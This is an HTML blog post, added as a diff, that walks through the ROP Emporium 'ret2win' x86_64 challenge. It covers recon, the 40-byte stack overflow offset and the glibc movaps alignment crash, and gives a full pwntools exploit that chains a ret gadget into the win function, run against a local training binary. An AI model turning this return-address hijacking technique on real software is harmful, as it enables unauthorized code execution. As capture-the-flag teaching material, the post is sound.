@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ROP Emporium — ret2win (x86_64) — Tiu</title>
+<style>
+  :root { --bg:#0d1117; --fg:#e6edf3; --dim:#8b949e; --acc:#58a6ff; --card:#161b22; --line:#30363d; }
+  * { box-sizing:border-box; }
+  body { margin:0; background:var(--bg); color:var(--fg);
+        font:16px/1.7 -apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; }
+  .wrap { max-width:860px; margin:0 auto; padding:2rem 1.2rem 4rem; }
+  header.site { border-bottom:1px solid var(--line); margin-bottom:2rem; padding-bottom:1rem; }
+  header.site h1 { margin:0; font-size:1.4rem; }
+  header.site .sub { color:var(--dim); font-size:.95rem; }
+  a { color:var(--acc); text-decoration:none; }
+  a:hover { text-decoration:underline; }
+  nav a { margin-right:1rem; color:var(--dim); }
+  article h1 { font-size:1.7rem; border-bottom:1px solid var(--line); padding-bottom:.4rem; }
+  h2 { margin-top:2rem; }
+  blockquote { margin:1rem 0; padding:.6rem 1rem; border-left:3px solid var(--acc);
+               background:var(--card); color:var(--dim); }
+  pre { background:var(--card); border:1px solid var(--line); border-radius:8px;
+        padding:1rem; overflow-x:auto; font-size:.88rem; }
+  code { font-family:"Cascadia Code",Consolas,Menlo,monospace; }
+  :not(pre) > code { background:var(--card); border:1px solid var(--line);
+                     border-radius:4px; padding:.1em .35em; font-size:.9em; }
+  table { border-collapse:collapse; width:100%; margin:1rem 0; }
+  th, td { border:1px solid var(--line); padding:.45rem .7rem; text-align:left; }
+  th { background:var(--card); }
+  .card { background:var(--card); border:1px solid var(--line); border-radius:10px;
+          padding:1.1rem 1.3rem; margin:1rem 0; display:block; color:var(--fg); }
+  .card:hover { border-color:var(--acc); text-decoration:none; }
+  .card .meta { color:var(--dim); font-size:.88rem; margin-top:.3rem; }
+  .card h3 { margin:.1rem 0 .3rem; color:var(--acc); }
+  footer { margin-top:3rem; padding-top:1rem; border-top:1px solid var(--line);
+           color:var(--dim); font-size:.85rem; }
+</style>
+</head>
+<body>
+<div class="wrap">
+<header class="site">
+  <h1><a href="index.html" style="color:inherit">Tiu — Security Research Notes</a></h1>
+  <div class="sub">Binary exploitation · Reverse engineering · Memory & network forensics</div>
+  <nav><a href="index.html">Posts</a><a href="https://github.com/dabai-sec">GitHub</a></nav>
+</header>
+<h1>ROP Emporium — ret2win (x86_64)</h1>
+<blockquote>
+<p><strong>Category:</strong> pwn / binary exploitation
+<strong>Binary:</strong> <a href="https://ropemporium.com/challenge/ret2win.html">ret2win</a> (ROP Emporium, x86_64)
+<strong>Techniques:</strong> stack buffer overflow, ret2win, ROP stack alignment (movaps / SIGSEGV gotcha)
+<strong>Environment:</strong> authorized training binary, local lab</p>
+</blockquote>
+<h2>1. Recon</h2>
+<pre><code>$ file ret2win
+ret2win: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
+
+$ readelf -l ret2win | grep GNU_STACK      # RW (no X)  -&gt; NX enabled
+$ readelf -h ret2win | grep Type
+Type: EXEC (Executable file)               # no PIE -&gt; .text at fixed addresses
+</code></pre>
+<p>No PIE and symbols present — the win function is right there:</p>
+<pre><code>$ nm ret2win | grep -iE &quot; ret2win| main| pwnme&quot;
+0000000000400697 T main
+00000000004006e8 t pwnme
+0000000000400756 t ret2win
+</code></pre>
+<h2>2. Vulnerability</h2>
+<p><code>pwnme()</code> reads 56 bytes into a 32-byte stack buffer via <code>read(0, buf, 56)</code>:</p>
+<pre><code>400744:  call  400590 &lt;read@plt&gt;
+</code></pre>
+<p>Classic linear stack overflow: 32-byte buffer + 8-byte saved <code>rbp</code> = <strong>offset 40</strong>
+to the saved return address.</p>
+<p><code>ret2win()</code> is the target. It prints the flag by calling <code>system()</code>:</p>
+<pre><code>0000000000400756 &lt;ret2win&gt;:
+  400756:  push   %rbp
+  400757:  mov    %rsp,%rbp
+  40075a:  mov    $0x400926,%edi          ; &quot;Well done! Here's your flag:&quot;
+  40075f:  call   400550 &lt;puts@plt&gt;
+  400764:  mov    $0x400943,%edi          ; &quot;/bin/cat flag.txt&quot;
+  400769:  call   400560 &lt;system@plt&gt;
+</code></pre>
+<h2>3. First attempt — and the movaps wall</h2>
+<p>Naive payload: <code>40 * "A" + p64(0x400756)</code>.</p>
+<pre><code>$ python3 -c &quot;...&quot; | ./ret2win
+&gt; Thank you!
+Well done! Here's your flag:
+Segmentation fault (core dumped)          # exit=139, no flag
+</code></pre>
+<p>The crash happens <strong>inside <code>system()</code></strong>, not at our hijack. Reason: modern
+glibc uses <code>movaps</code> on the stack, which requires 16-byte alignment. When we
+return directly into <code>ret2win</code>, <code>RSP</code> is 8 bytes off — <code>puts()</code> survives, but
+<code>system()</code> hits a <code>movaps</code> on a misaligned address and dies with SIGSEGV.</p>
+<p>Standard fix: prepend a single <code>ret</code> gadget to re-align the stack before
+entering <code>ret2win</code>:</p>
+<pre><code>$ objdump -d ret2win | grep -E &quot;^\s+40[0-9a-f]+:\s+c3\s+ret&quot; | head -1
+  40053e:  c3  ret
+</code></pre>
+<h2>4. Exploit</h2>
+<p><code>exploit.py</code>:</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+from pwn import *
+
+elf = context.binary = ELF(&quot;./ret2win&quot;, checksec=False)
+
+RET      = 0x40053e   # ret gadget  (stack alignment for glibc movaps)
+RET2WIN  = elf.symbols[&quot;ret2win&quot;]   # 0x400756
+OFFSET   = 40         # 32-byte buffer + 8-byte saved rbp
+
+io = process(&quot;./ret2win&quot;)
+payload = flat(
+    b&quot;A&quot; * OFFSET,
+    RET,        # align RSP to 16 bytes for system()
+    RET2WIN,    # win()
+)
+io.sendline(payload)
+print(io.recvall().decode(errors=&quot;replace&quot;))
+</code></pre>
+<h2>5. Result</h2>
+<pre><code>$ python3 exploit.py
+ret2win by ROP Emporium
+x86_64
+...
+&gt; Thank you!
+Well done! Here's your flag:
+ROPE{a_placeholder_32byte_flag!}
+</code></pre>
+<p>(Placeholder flag — this is the local training binary; the point is the
+control-flow hijack succeeding cleanly with <code>exit=0</code>.)</p>
+<h2>Takeaways</h2>
+<ul>
+<li>ret2win is "trivial" only until modern glibc alignment bites you. If
+  <code>system()</code> segfaults after a clean hijack, think <strong>stack alignment</strong> first.</li>
+<li>One <code>ret</code> gadget is the cheapest alignment shim you will ever use.</li>
+<li>No-PIE + symbols = static addresses; the whole chain is two qwords.</li>
+</ul>
+<footer>All research performed in authorized environments (CTF events, lab ranges,
+public training datasets). · © 2026 Tiu</footer>
+</div>
+</body>
+</html>
